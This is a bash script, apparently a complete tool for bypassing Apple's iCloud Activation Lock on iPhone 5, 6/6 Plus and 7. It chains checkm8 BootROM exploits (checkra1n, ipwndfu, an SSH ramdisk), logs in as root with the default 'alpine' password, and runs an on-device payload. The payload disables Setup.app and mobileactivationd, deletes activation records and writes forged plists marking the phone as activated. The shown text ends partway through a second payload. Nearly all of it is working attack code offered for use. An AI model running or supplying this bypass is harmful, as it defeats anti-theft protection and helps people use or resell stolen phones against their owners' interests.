#!/bin/bash
# ═══════════════════════════════════════════════════════
# icloud-unlock — Activation Lock Bypass
# Targets: 1x iPhone 5 (A6), 3x iPhone 6 / 6 Plus (A8)
# ═══════════════════════════════════════════════════════
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
LOG_FILE="$SCRIPT_DIR/unlock.log"
TOOLS_DIR="$SCRIPT_DIR/bin"
export PATH="$TOOLS_DIR:$PATH"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

log() { echo "[$(date '+%H:%M:%S')] $1" >> "$LOG_FILE"; }
info() { echo -e "${CYAN}[*]${NC} $1"; log "$1"; }
success() { echo -e "${GREEN}[✓]${NC} $1"; log "SUCCESS: $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; log "WARN: $1"; }
fail() { echo -e "${RED}[✗]${NC} $1"; log "FAIL: $1"; }
header() { echo -e "\n${BOLD}━━━ $1 ━━━${NC}\n"; }

command_is_executable() {
    local target="${1:-}"
    if [ -z "$target" ]; then
        return 1
    fi

    local path
    path="$(command -v "$target" 2>/dev/null || true)"
    if [ -z "$path" ]; then
        return 1
    fi

    [ -x "$path" ]
}

is_checkra1n_command() {
    local path
    path="$(command -v "$1" 2>/dev/null || true)"
    if [ -z "$path" ] || [ ! -x "$path" ]; then
        return 1
    fi

    if file "$path" 2>/dev/null | grep -q "Mach-O"; then
        local rc=0
        if command -v timeout >/dev/null 2>&1; then
            timeout 3 "$path" -h >/dev/null 2>&1 || rc=$?
        else
            "$path" -h >/dev/null 2>&1 || rc=$?
        fi

        if [ "$rc" -eq 124 ] || [ "$rc" -eq 0 ] || [ "$rc" -eq 1 ]; then
            return 0
        fi
        return 1
    fi

    if head -n 1 "$path" 2>/dev/null | grep -q "^#!"; then
        return 0
    fi

    return 1
}

DEVICE_MODE=""
DEVICE_PRODUCT=""
DEVICE_CHIP=""
DEVICE_IOS=""
DEVICE_UDID=""
BYPASS_METHOD=""
IOS_VERSION=""
IPHONE5_SSH=""
FORCED_DEVICE_TAG=""
WORKFLOW_MODE="ask"
DFU_ASSIST=1
USE_CHECKRA1N_TUI=0
FORCED_MODEL_SET=0

usage() {
    cat <<'USAGE'
Usage: bash unlock.sh [--model i5|i6|i6p|i7] [--workflow unlock|reset|ask] [--factory-reset] [--bypass] [--dfu-coach|--no-dfu-coach] [--help]
       [--checkra1n-mode cli|tui]

Options:
  --model    Skip manual DFU model prompt by forcing expected device family:
             i5 (iPhone 5 / A6), i6 / i6p (iPhone 6 / iPhone 6 Plus / A8), i7 (iPhone 7 / A10 legacy)
  --workflow Choose run mode:
             ask (ask per-device, default), unlock, reset
  --factory-reset   Alias for --workflow reset
  --bypass          Alias for --workflow unlock
  --dfu-coach       Turn on guided DFU timing tips (default)
  --no-dfu-coach    Disable guided DFU timing tips
  --checkra1n-mode  Use checkra1n mode:
                    cli (run -c, default) or tui (run -t / interactive)
  --help     Show this help text

Example:
  bash unlock.sh --model i6
USAGE
}

set_device_by_choice() {
    local choice=$1
    case "$choice" in
        1|i5|I5|a6|A6|A1429|iPhone5|iPhone5,1|iPhone5,2|iPhone5,3|iPhone5,4|iPhone5,x)
            DEVICE_PRODUCT="iPhone5,x"
            DEVICE_CHIP="A6"
            BYPASS_METHOD="ipwndfu"
            return 0
            ;;
        2|i6|I6|i6p|I6P|i6-plus|i6plus|iPhone6plus|iPhone6p|iPhone6+|A1524|A1586|iPhone7,1|iPhone7,2|a8|A8)
            DEVICE_PRODUCT="iPhone7,2"
            DEVICE_CHIP="A8"
            BYPASS_METHOD="sshrd"
            IOS_VERSION="${IOS_VERSION:-12.5.7}"
            return 0
        ;;
        3|i7|I7|a10|A10|iPhone7|iPhone9,1|iPhone9,2|iPhone9,3|iPhone9,4|iPhone9,x)
            DEVICE_PRODUCT="iPhone9,x"
            DEVICE_CHIP="A10"
            BYPASS_METHOD="checkra1n"
            return 0
            ;;
        *)
            return 1
            ;;
    esac
}

parse_args() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --model|--device)
                if [[ $# -lt 2 ]]; then
                    fail "Missing value for --model"
                    usage
                    exit 1
                fi
                FORCED_DEVICE_TAG="$2"
                if ! set_device_by_choice "$FORCED_DEVICE_TAG"; then
                    fail "Invalid value for --model: $FORCED_DEVICE_TAG"
                    usage
                    exit 1
                fi
                FORCED_MODEL_SET=1
                shift 2
                ;;
            --workflow)
                if [[ $# -lt 2 ]]; then
                    fail "Missing value for --workflow"
                    usage
                    exit 1
                fi
                WORKFLOW_MODE="$2"
                shift 2
                ;;
            --factory-reset)
                WORKFLOW_MODE="reset"
                shift
                ;;
            --bypass)
                WORKFLOW_MODE="unlock"
                shift
                ;;
            --dfu-coach)
                DFU_ASSIST=1
                shift
                ;;
            --no-dfu-coach)
                DFU_ASSIST=0
                shift
                ;;
            --checkra1n-mode)
                if [[ $# -lt 2 ]]; then
                    fail "Missing value for --checkra1n-mode"
                    usage
                    exit 1
                fi
                case "$2" in
                    cli)
                        USE_CHECKRA1N_TUI=0
                        ;;
                    tui)
                        USE_CHECKRA1N_TUI=1
                        ;;
                    *)
                        fail "Invalid value for --checkra1n-mode: $2"
                        usage
                        exit 1
                        ;;
                esac
                shift 2
                ;;
            -h|--help)
                usage
                exit 0
                ;;
            *)
                fail "Unknown argument: $1"
                usage
                exit 1
                ;;
        esac
    done
}

# ─── Dependency Check ───
check_deps() {
    header "Checking Dependencies"
    local missing=0
    local dependency_type="unlock"

    if [ "$WORKFLOW_MODE" = "reset" ]; then
        dependency_type="reset"
    fi

    for cmd in idevice_id; do
        if command -v "$cmd" &>/dev/null; then
            success "$cmd"
        else
            fail "$cmd — not found"
            missing=1
        fi
    done

    if [ "$dependency_type" = "unlock" ]; then
        for cmd in ideviceinfo iproxy sshpass; do
            if command -v "$cmd" &>/dev/null; then
                success "$cmd"
            else
                fail "$cmd — not found"
                missing=1
            fi
        done

        if is_checkra1n_command checkra1n; then
            success "checkra1n (for iPhone 7 / A10)"
        else
            warn "checkra1n not found — needed for iPhone 7 / A10 (not needed for A8 SSHRD bypass)"
        fi

        if command -v gaster &>/dev/null || [ -d "$SCRIPT_DIR/sshrd" ]; then
            success "SSHRD_Script (for iPhone 6 / 6 Plus / A8)"
        else
            warn "SSHRD_Script not cloned — needed for iPhone 6 / 6 Plus (A8 bypass)"
            echo "  Will be auto-cloned on first run."
        fi

        if [ -d "$SCRIPT_DIR/ipwndfu" ] && [ -f "$SCRIPT_DIR/ipwndfu/ipwndfu" ]; then
            success "ipwndfu (for iPhone 5)"
        else
            warn "ipwndfu not cloned yet — needed for iPhone 5"
            echo "  Run: cd $SCRIPT_DIR && git clone https://github.com/axi0mX/ipwndfu.git"
        fi
    elif command -v ideviceenterrecovery &>/dev/null; then
        success "ideviceenterrecovery (optional factory reset assist)"
    fi

    if [ $missing -eq 1 ]; then
        echo ""
        warn "Some deps missing. Run setup.sh first."
        read -p "  Continue anyway? (y/n): " cont
        [ "$cont" != "y" ] && exit 1
    fi
}

# ─── Device Detection ───
detect_device() {
    header "Phase 1: Device Detection"
    info "Looking for connected device..."

    local udid
    udid=$(idevice_id -l 2>/dev/null | head -1) || true

    if [ -z "$udid" ]; then
        if system_profiler SPUSBDataType 2>/dev/null | grep -qi "Apple Mobile Device (DFU)\|Apple Mobile Device (Recovery)"; then
            success "Device in DFU/Recovery mode"
            DEVICE_MODE="dfu"
            if [ -n "$FORCED_DEVICE_TAG" ]; then
                if set_device_by_choice "$FORCED_DEVICE_TAG"; then
                    success "Forced device: $FORCED_DEVICE_TAG (method=$BYPASS_METHOD)"
                else
                    fail "Invalid --model value: $FORCED_DEVICE_TAG"
                    return 1
                fi
            else
                echo ""
                echo "  Can't read info in DFU. Which device is this?"
                echo "    1) iPhone 5  (A6)"
                echo "    2) iPhone 6 / 6 Plus  (A8)"
                echo "    3) iPhone 7  (A10 legacy)"
                read -p "  Enter 1, 2, or 3: " choice
                set_device_by_choice "$choice" || { fail "Invalid"; exit 1; }
            fi
            return 0
        fi

        if [ "$FORCED_MODEL_SET" -eq 1 ]; then
            success "Forced model active: $FORCED_DEVICE_TAG (method=$BYPASS_METHOD)"
            DEVICE_MODE="forced"
            return 0
        fi

        fail "No device detected. Check cable and USB port."
        return 1
    fi

    DEVICE_MODE="normal"
    DEVICE_UDID="$udid"
    success "Device: $udid"

    local product_type ios_version serial imei

    if command -v ideviceinfo &>/dev/null; then
        product_type=$(ideviceinfo -u "$udid" -k ProductType 2>/dev/null) || product_type="unknown"
        ios_version=$(ideviceinfo -u "$udid" -k ProductVersion 2>/dev/null) || ios_version="unknown"
        serial=$(ideviceinfo -u "$udid" -k SerialNumber 2>/dev/null) || serial="unknown"
        imei=$(ideviceinfo -u "$udid" -k InternationalMobileEquipmentIdentity 2>/dev/null) || imei="N/A"
    else
        product_type="unknown"
        ios_version="unknown"
        serial="unknown"
        imei="N/A"
        warn "ideviceinfo missing. Product details unavailable."
    fi

    case $product_type in
        iPhone5,1|iPhone5,2)       DEVICE_CHIP="A6";  BYPASS_METHOD="ipwndfu" ;;
        iPhone5,3|iPhone5,4)       DEVICE_CHIP="A6";  BYPASS_METHOD="ipwndfu" ;;
        iPhone7,1|iPhone7,2)       DEVICE_CHIP="A8";  BYPASS_METHOD="sshrd"; IOS_VERSION="${ios_version:-12.5.7}" ;;
        iPhone9,1|iPhone9,2|iPhone9,3|iPhone9,4) DEVICE_CHIP="A10"; BYPASS_METHOD="checkra1n" ;;
        *) DEVICE_CHIP="??"; BYPASS_METHOD="checkra1n"; warn "Unexpected: $product_type" ;;
    esac

    DEVICE_PRODUCT="$product_type"
    DEVICE_IOS="$ios_version"

    echo ""
    echo "  ┌─────────────────────────────────┐"
    echo "  │ Model:   $product_type"
    echo "  │ Chip:    $DEVICE_CHIP"
    echo "  │ iOS:     $ios_version"
    echo "  │ Serial:  $serial"
    echo "  │ IMEI:    $imei"
    echo "  │ Method:  $BYPASS_METHOD"
    echo "  └─────────────────────────────────┘"
}

get_device_usb_state() {
    if system_profiler SPUSBDataType 2>/dev/null | grep -qi "Apple Mobile Device (DFU)"; then
        printf 'dfu'
        return
    fi

    if system_profiler SPUSBDataType 2>/dev/null | grep -qi "Apple Mobile Device (Recovery)"; then
        printf 'recovery'
        return
    fi

    if idevice_id -l 2>/dev/null | grep -q .; then
        printf 'normal'
        return
    fi

    printf 'none'
}

coach_dfu_sequence() {
    local chip="$1"
    local state="$2"
    local elapsed="$3"
    local state_msg=""

    case "$state" in
        recovery)
            state_msg="Recovery mode detected. Do this immediately from this screen:\n  1) Hold POWER + HOME together for 8 seconds\n  2) Release POWER, keep HOME for 5 seconds\n  3) Keep HOME until screen is fully black, then release"
            ;;
        normal)
            state_msg="Device is in normal mode. If the screen is on, first turn it OFF with POWER, then start DFU timing."
            ;;
        none)
            state_msg="No USB state yet. Start when the screen goes black/off."
            ;;
        *)
            state_msg=""
            ;;
    esac

    if [ -n "$state_msg" ]; then
        echo ""
        printf "  %b\n" "$state_msg"
    fi

    case "$chip" in
        A6|A8)
            if [ "$state" = "recovery" ]; then
                echo "  1) Hold ${BOLD}POWER + HOME${NC} together for 8 seconds."
                echo "  2) Release POWER, keep HOME for 5 seconds."
                echo "  3) If screen goes black, hold HOME exactly until it stays black, then release."
                echo "  4) If Apple logo appears, timing was wrong — do it again from OFF screen."
            else
                echo "  1) Hold ${BOLD}POWER + HOME${NC} together for 8 seconds."
                echo "  2) Release POWER, keep HOME for 5 seconds."
                echo "  3) Release HOME once screen remains black (no logo)."
            fi
            ;;
        A10)
            echo "  1) Hold ${BOLD}POWER + VOL DOWN${NC} for 8 seconds"
            echo "  2) Release POWER, keep VOL DOWN for 5 more seconds"
            ;;
        *)
            echo "  1) Enter the correct model-specific DFU combo"
            echo "  2) Use the screen-off sequence for your model"
            ;;
    esac
    if [ "$chip" != "A6" ] && [ "$chip" != "A8" ]; then
        echo "  3) Keep screen black (no Apple logo)"
    fi
    echo "  Elapsed: ${elapsed}s"
    if [ "$chip" = "A10" ] || [ "$chip" = "A6" ] || [ "$chip" = "A8" ]; then
        if [ "$chip" = "A10" ]; then
            echo "  Keep holding VOL DOWN only during step 2."
        else
            echo "  Keep holding HOME only during step 2."
        fi
    else
        echo "  Keep holding the button in step 2."
    fi
    return
}

# ─── Enter DFU Mode ───
enter_dfu() {
    header "Phase 2: Enter DFU Mode"

    if system_profiler SPUSBDataType 2>/dev/null | grep -qi "Apple Mobile Device (DFU)"; then
        success "Already in DFU."
        return 0
    fi

    echo "  Put device into DFU mode:"
    echo ""
    case $DEVICE_CHIP in
        A6|A8)
            echo "  If screen is ON or on Welcome/activation: power it off first."
            echo "  Hold ${BOLD}POWER + HOME${NC} together for 8 seconds."
            echo "  Release ${BOLD}POWER${NC}, keep ${BOLD}HOME${NC} for 5 seconds."
            echo "  Let go of HOME only when the screen stays black."
            ;;
        A10)
            echo "  Hold ${BOLD}POWER + VOL DOWN${NC} for 8 sec"
            echo "  Release ${BOLD}POWER${NC}, keep ${BOLD}VOL DOWN${NC} 5 more sec"
            ;;
    esac
    echo ""
    echo "  Screen must be BLACK (not Apple logo)."
    echo ""

    if [ "$DFU_ASSIST" -eq 1 ]; then
        echo "  DFU coach enabled: follow the countdown and try the sequence until DFU is detected."
    else
        echo "  Waiting for DFU..."
    fi

    info "Waiting for DFU..."
    local state
    local last_hint=0
    local elapsed=0
    local recovery_count=0
    local last_state=""
    while true; do
        state="$(get_device_usb_state)"
        [ "$state" = "dfu" ] && success "DFU detected!" && return 0

        if [ "$state" = "recovery" ]; then
            if [ "$last_state" = "recovery" ]; then
                recovery_count=$((recovery_count + 1))
            else
                recovery_count=1
            fi
        else
            recovery_count=0
        fi
        last_state="$state"

        if [ "$DFU_ASSIST" -eq 1 ]; then
            if [ $((elapsed - last_hint)) -ge 10 ] || [ "$elapsed" -eq 0 ]; then
                coach_dfu_sequence "$DEVICE_CHIP" "$state" "$elapsed"
                last_hint=$elapsed
            fi
            if [ "$state" = "recovery" ] && [ "$recovery_count" -ge 2 ]; then
                echo "  Recovery loop detected. Do this now: leave home off for 1 second, then start Power+HOME again."
            fi
        else
            [ $((elapsed % 15)) -eq 0 ] && echo "  ... ${elapsed}s — do the button combo now"
        fi

        sleep 1
        elapsed=$((elapsed + 1))
        [ $elapsed -ge 180 ] && { fail "Timed out."; return 1; }
    done
}

# ─── Workflow Selection ───
normalize_workflow() {
    local value=$1
    case "$value" in
        unlock|bypass|ask)
            printf '%s' "$value"
            return 0
            ;;
        factory-reset|full-reset|reset)
            printf '%s' "reset"
            return 0
            ;;
        1|b|B|u|U)
            printf '%s' "unlock"
            return 0
            ;;
        2|r|R|f|F)
            printf '%s' "reset"
            return 0
            ;;
        "")
            printf '%s' "ask"
            return 0
            ;;
        *)
            return 1
            ;;
    esac
}

prompt_workflow() {
    local choice=""

    if [ "$WORKFLOW_MODE" != "ask" ]; then
        local normalized=""
        if ! normalized=$(normalize_workflow "$WORKFLOW_MODE"); then
            fail "Invalid workflow: $WORKFLOW_MODE"
            normalized="unlock"
        fi
        WORKFLOW_MODE="$normalized"
        return 0
    fi

    echo ""
    echo "  Which flow do you want for this device?"
    echo "    1) Activation Lock bypass (default)"
    echo "    2) Full factory reset (erase + restore)"
    read -r -p "  Enter 1 or 2 [1]: " choice
    [ -z "$choice" ] && choice=1

    WORKFLOW_MODE=$(normalize_workflow "$choice" || printf '%s' "unlock")
}

run_factory_reset() {
    header "Phase 3: Full Factory Reset"
    warn "Factory reset flow selected. Skipping unlock/bypass steps."

    if [ "$DEVICE_MODE" = "normal" ] && [ -n "${DEVICE_UDID:-}" ] && command -v ideviceenterrecovery &>/dev/null; then
        info "Optionally place phone into Recovery from this machine now."
        read -r -p "  Send to Recovery automatically? (y/n): " send_recovery
        if [ "$send_recovery" = "y" ]; then
            if ideviceenterrecovery "$DEVICE_UDID" &>/dev/null; then
                success "Sent device to Recovery."
            else
                warn "Failed to send to Recovery automatically."
            fi
        fi
    elif [ "$DEVICE_MODE" = "normal" ] && [ -n "${DEVICE_UDID:-}" ] && ! command -v ideviceenterrecovery &>/dev/null; then
        warn "ideviceenterrecovery missing. You may need to place the phone into recovery manually."
    fi

    echo ""
    echo "  To complete reset:"
    echo "    1) Open Finder (or iTunes on older macOS)."
    echo "    2) Put phone in Recovery mode if needed."
    echo "    3) Click Restore and allow the full erase/restore to finish."
    echo "    4) Continue when setup wizard is reached."
    echo ""

    read -r -p "  When ready, press ENTER to continue to next device (or q to stop): " done_input
    [ "$done_input" = "q" ] && return 1
    success "Factory reset handoff acknowledged."
}


# ─── Jailbreak: checkra1n (A8 / iPhone 6 / 6 Plus) ───
jailbreak_checkra1n() {
    header "Phase 3: checkra1n Jailbreak ($DEVICE_CHIP)"
    info "Exploiting checkm8 BootROM vulnerability..."

    if [ "$USE_CHECKRA1N_TUI" -eq 1 ]; then
        info "Running checkra1n interactive mode (guided DFU + jailbreak)."
        info "Follow the on-screen timing instructions for your device."
        if checkra1n -t; then
            success "checkra1n done."
        else
            fail "checkra1n interactive mode failed."
            fail "Try USB-A cable, different port, or run: bash unlock.sh --checkra1n-mode cli"
            return 1
        fi
    else
        if checkra1n -c -v; then
            success "checkra1n done!"
        else
            fail "checkra1n failed. Falling back to interactive mode."
            info "Running checkra1n interactive mode as fallback."
            if checkra1n -t; then
                success "checkra1n done."
            else
                fail "checkra1n failed. Try USB-A cable, different port, or --checkra1n-mode tui"
                return 1
            fi
        fi
    fi

    info "Waiting 45s for jailbroken boot..."
    sleep 45

    local attempts=0
    while ! idevice_id -l 2>/dev/null | grep -q .; do
        sleep 5; attempts=$((attempts + 1))
        [ $attempts -ge 12 ] && { warn "Still waiting. Give it another minute."; read -p "  ENTER to continue: " _; break; }
    done
    success "Device booted."
}

# ─── Exploit: ipwndfu (iPhone 5) ───
jailbreak_ipwndfu() {
    header "Phase 3: ipwndfu Exploit (A6 / iPhone 5)"

    if [ ! -d "$SCRIPT_DIR/ipwndfu" ]; then
        info "Cloning ipwndfu..."
        git clone https://github.com/axi0mX/ipwndfu.git "$SCRIPT_DIR/ipwndfu" 2>/dev/null || {
            fail "Clone failed. Run: git clone https://github.com/axi0mX/ipwndfu.git"
            return 1
        }
    fi

    pip3 install pyusb 2>/dev/null || true

    cd "$SCRIPT_DIR/ipwndfu"
    info "Running checkm8 exploit via ipwndfu..."

    if python3 ./ipwndfu -p 2>/dev/null || python2 ./ipwndfu -p 2>/dev/null; then
        success "PWNED DFU mode active!"
    else
        fail "ipwndfu failed. Try: USB-A cable, different port, multiple attempts."
        cd "$SCRIPT_DIR"
        return 1
    fi

    # Boot SSH ramdisk for filesystem access
    if [ ! -d "$SCRIPT_DIR/sshrd" ]; then
        info "Cloning SSHRD_Script (SSH ramdisk)..."
        git clone https://github.com/verygenericname/SSHRD_Script.git "$SCRIPT_DIR/sshrd" 2>/dev/null || {
            fail "Clone failed. Run: git clone https://github.com/verygenericname/SSHRD_Script.git $SCRIPT_DIR/sshrd"
            cd "$SCRIPT_DIR"
            return 1
        }
    fi

    cd "$SCRIPT_DIR/sshrd"
    chmod +x ./sshrd.sh 2>/dev/null || true

    local ios_ver="${DEVICE_IOS:-10.3.4}"
    info "Creating SSH ramdisk for iOS $ios_ver..."
    ./sshrd.sh create "$ios_ver" 2>/dev/null || ./sshrd.sh create 2>/dev/null || true

    info "Booting SSH ramdisk..."
    ./sshrd.sh boot 2>/dev/null || true

    info "Waiting 30s for ramdisk boot..."
    sleep 30

    IPHONE5_SSH="true"
    cd "$SCRIPT_DIR"
    success "iPhone 5 exploit chain done."
}

# ─── SSHRD: Ensure ramdisk is ready ───
sshrd_ensure_ready() {
    header "Phase 3a: Prepare SSH Ramdisk"

    if [ ! -d "$SCRIPT_DIR/sshrd" ]; then
        info "Cloning SSHRD_Script..."
        git clone https://github.com/verygenericname/SSHRD_Script.git "$SCRIPT_DIR/sshrd" 2>/dev/null || {
            fail "Clone failed. Run: git clone https://github.com/verygenericname/SSHRD_Script.git $SCRIPT_DIR/sshrd"
            return 1
        }
    fi

    cd "$SCRIPT_DIR/sshrd"
    chmod +x ./sshrd.sh 2>/dev/null || true

    if [ -d "$SCRIPT_DIR/sshrd/sshramdisk" ]; then
        success "SSH ramdisk already cached."
        cd "$SCRIPT_DIR"
        return 0
    fi

    local ios_ver="${IOS_VERSION:-12.5.7}"
    info "Creating SSH ramdisk for iOS $ios_ver (first time takes 2-5 min)..."
    if ./sshrd.sh "$ios_ver"; then
        success "SSH ramdisk created."
    else
        fail "Failed to create SSH ramdisk."
        cd "$SCRIPT_DIR"
        return 1
    fi

    cd "$SCRIPT_DIR"
}

# ─── SSHRD: Boot ramdisk and connect SSH ───
sshrd_boot() {
    header "Phase 3b: Boot SSH Ramdisk"

    cd "$SCRIPT_DIR/sshrd"

    info "Booting SSHRD ramdisk (gaster pwn + irecovery)..."
    if ./sshrd.sh boot; then
        success "SSHRD boot sequence sent."
    else
        fail "SSHRD boot failed. Ensure device is in DFU and try again."
        cd "$SCRIPT_DIR"
        return 1
    fi

    cd "$SCRIPT_DIR"

    # Start iproxy tunnel
    pkill -f "iproxy 2222" 2>/dev/null || true
    sleep 1
    iproxy 2222 22 &>/dev/null &
    local proxy_pid=$!
    sleep 2

    # Wait for SSH connection (up to 60s)
    local ssh_opts="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5"
    local elapsed=0
    info "Waiting for SSH connection (up to 60s)..."
    while [ $elapsed -lt 60 ]; do
        if sshpass -p alpine ssh $ssh_opts -p 2222 root@localhost "echo ok" &>/dev/null; then
            success "SSH connected to SSHRD ramdisk."
            SSH_CMD="sshpass -p alpine ssh $ssh_opts -p 2222 root@localhost"
            return 0
        fi
        sleep 2
        elapsed=$((elapsed + 2))
        [ $((elapsed % 10)) -eq 0 ] && info "  ... ${elapsed}s waiting for SSH"
    done

    fail "SSH connection timed out after 60s."
    kill $proxy_pid 2>/dev/null || true
    return 1
}

# ─── SSHRD: Full activation lock bypass ───
bypass_via_sshrd() {
    header "Phase 4: SSHRD Activation Lock Bypass"

    info "Executing bypass on SSHRD ramdisk..."
    echo ""

    $SSH_CMD << 'SSHRD_BYPASS'
#!/bin/sh
echo "[sshrd] === SSHRD Activation Lock Bypass ==="

# ── Mount filesystems ──
echo "[sshrd] Mounting device filesystems..."

# rootfs
if mount | grep -q "/mnt1"; then
    echo "[sshrd]   /mnt1 already mounted"
else
    mount -t apfs /dev/disk0s1s1 /mnt1 2>/dev/null || \
    mount_apfs /dev/disk0s1s1 /mnt1 2>/dev/null || \
    mount -t hfs /dev/disk0s1s1 /mnt1 2>/dev/null || true
fi

# data partition
if mount | grep -q "/mnt2"; then
    echo "[sshrd]   /mnt2 already mounted"
else
    mount -t apfs /dev/disk0s1s2 /mnt2 2>/dev/null || \
    mount_apfs /dev/disk0s1s2 /mnt2 2>/dev/null || \
    mount -t hfs /dev/disk0s1s2 /mnt2 2>/dev/null || true
fi

# Verify mounts
if [ ! -d "/mnt1/Applications" ]; then
    echo "[sshrd] ERROR: /mnt1/Applications not found — rootfs not mounted"
    echo "[sshrd] Trying alternate mount..."
    mount_apfs -o rw /dev/disk0s1s1 /mnt1 2>/dev/null || true
    if [ ! -d "/mnt1/Applications" ]; then
        echo "[sshrd] FATAL: Cannot mount rootfs. Aborting."
        exit 1
    fi
fi
echo "[sshrd]   rootfs mounted at /mnt1"

if [ ! -d "/mnt2/root" ] && [ ! -d "/mnt2/mobile" ]; then
    echo "[sshrd] WARNING: /mnt2 data partition may not be mounted correctly"
fi
echo "[sshrd]   data partition mounted at /mnt2"

# ── Remove Setup.app ──
echo ""
echo "[sshrd] Step 1: Disabling Setup.app..."
if [ -d "/mnt1/Applications/Setup.app" ]; then
    mv "/mnt1/Applications/Setup.app" "/mnt1/Applications/Setup.app.disabled" && \
        echo "[sshrd]   MOVED Setup.app -> Setup.app.disabled" || \
        echo "[sshrd]   FAILED to move Setup.app"
else
    echo "[sshrd]   Setup.app already disabled or not found"
fi

# ── Disable mobileactivationd ──
echo ""
echo "[sshrd] Step 2: Disabling mobileactivationd..."
DP="/mnt1/System/Library/LaunchDaemons/com.apple.mobileactivationd.plist"
if [ -f "$DP" ]; then
    mv "$DP" "${DP}.disabled" && \
        echo "[sshrd]   Disabled mobileactivationd launch daemon" || \
        echo "[sshrd]   FAILED to disable daemon plist"
else
    echo "[sshrd]   Daemon plist already disabled or not found"
fi

# ── Clear activation records ──
echo ""
echo "[sshrd] Step 3: Clearing activation records..."
rm -rf /mnt2/root/Library/Lockdown/activation_records 2>/dev/null
mkdir -p /mnt2/root/Library/Lockdown/activation_records
rm -rf /mnt2/mobile/Library/mad/activation_records 2>/dev/null
mkdir -p /mnt2/mobile/Library/mad
echo "[sshrd]   Activation records cleared"

# ── Write data_ark.plist ──
echo ""
echo "[sshrd] Step 4: Writing activation state..."
mkdir -p /mnt2/root/Library/Lockdown
cat > /mnt2/root/Library/Lockdown/data_ark.plist << 'PLIST1'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>ActivationState</key>
    <string>Activated</string>
    <key>BrickState</key>
    <false/>
</dict>
</plist>
PLIST1
chmod 644 /mnt2/root/Library/Lockdown/data_ark.plist
echo "[sshrd]   Wrote data_ark.plist with ActivationState=Activated"

# ── Write stub activation record ──
echo ""
echo "[sshrd] Step 5: Writing stub activation record..."
cat > /mnt2/root/Library/Lockdown/activation_records/activation_record.plist << 'PLIST2'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>ActivationState</key>
    <string>Activated</string>
</dict>
</plist>
PLIST2
chmod 644 /mnt2/root/Library/Lockdown/activation_records/activation_record.plist
echo "[sshrd]   Wrote stub activation_record.plist"

# ── Mark setup complete ──
echo ""
echo "[sshrd] Step 6: Marking setup complete..."
mkdir -p /mnt2/mobile/Library/Preferences
cat > /mnt2/mobile/Library/Preferences/com.apple.purplebuddy.plist << 'PLIST3'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>SetupDone</key>
    <true/>
    <key>SetupFinishedAllSteps</key>
    <true/>
</dict>
</plist>
PLIST3
chmod 644 /mnt2/mobile/Library/Preferences/com.apple.purplebuddy.plist
echo "[sshrd]   Wrote purplebuddy.plist with SetupDone=true"

# ── Summary ──
echo ""
echo "[sshrd] ══════════════════════════════════════"
echo "[sshrd] SSHRD BYPASS COMPLETE"
echo "[sshrd] ══════════════════════════════════════"
echo "[sshrd]   Setup.app disabled"
echo "[sshrd]   mobileactivationd disabled"
echo "[sshrd]   Activation records cleared + patched"
echo "[sshrd]   Setup marked complete"
echo "[sshrd] Device will reboot now..."
SSHRD_BYPASS

    echo ""
    success "SSHRD bypass executed."

    info "Rebooting device..."
    $SSH_CMD "reboot" 2>/dev/null || true
    pkill -f "iproxy 2222" 2>/dev/null || true
    sleep 3

    success "Device rebooting. It should boot directly to home screen."
    echo ""
    echo "  SSHRD bypass modifies persistent filesystem — no tethered reboot needed."
    echo "  If device still shows Activation Lock:"
    echo "    1. Re-enter DFU mode"
    echo "    2. Run: bash unlock.sh --model i6p"
    echo "    or: bash bypass.sh --sshrd"
    echo ""
}

# ─── Activation Lock Bypass ───
bypass_activation() {
    header "Phase 4: Remove Activation Lock"

    local SSH proxy_pid=""

    if [ "$IPHONE5_SSH" = "true" ]; then
        # SSHRD sets up its own tunnel
        SSH="sshpass -p alpine ssh -o StrictHostKeyChecking=no -o ConnectTimeout=15 -p 2222 root@localhost"
    else
        pkill -f "iproxy 2222" 2>/dev/null || true
        sleep 1
        iproxy 2222 44 &>/dev/null &
        proxy_pid=$!
        sleep 3
        SSH="sshpass -p alpine ssh -o StrictHostKeyChecking=no -o ConnectTimeout=15 -p 2222 root@localhost"
    fi

    info "Testing SSH..."
    if ! $SSH "echo ok" &>/dev/null; then
        if [ -n "$proxy_pid" ]; then
            kill $proxy_pid 2>/dev/null || true
            iproxy 2222 22 &>/dev/null &
            proxy_pid=$!
            sleep 3
        fi
        if ! $SSH "echo ok" &>/dev/null; then
            fail "SSH failed."
            echo "  iPhone 6/7: Open checkra1n on device → install Cydia → install OpenSSH"
            echo "  iPhone 5: SSHRD may not have booted. Re-run."
            [ -n "$proxy_pid" ] && kill $proxy_pid 2>/dev/null
            return 1
        fi
    fi
    success "SSH connected."

    info "Executing activation bypass on device..."
    echo ""

    $SSH << 'BYPASS_PAYLOAD'
#!/bin/bash
echo "[device] === Activation Lock Bypass ==="

# Mount filesystem rw (try APFS first, then HFS)
echo "[device] Mounting rw..."
/sbin/mount -u / 2>/dev/null || true
mount -o rw,update / 2>/dev/null || true
mount_apfs -uw / 2>/dev/null || true
/usr/bin/mount -uw / 2>/dev/null || true
mount -o rw,union,update / 2>/dev/null || true
# Test and report
if touch /.bypass_rw_test 2>/dev/null; then
    rm -f /.bypass_rw_test
    echo "[device] rootfs is writable"
else
    echo "[device] WARNING: rootfs still read-only"
    echo "[device] Trying APFS snapshot rename..."
    snappy -f / -r orig-fs 2>/dev/null || true
    /sbin/mount -u / 2>/dev/null || true
fi
# SSHRD mounts
mount -t apfs /dev/disk0s1s1 /mnt1 2>/dev/null || true
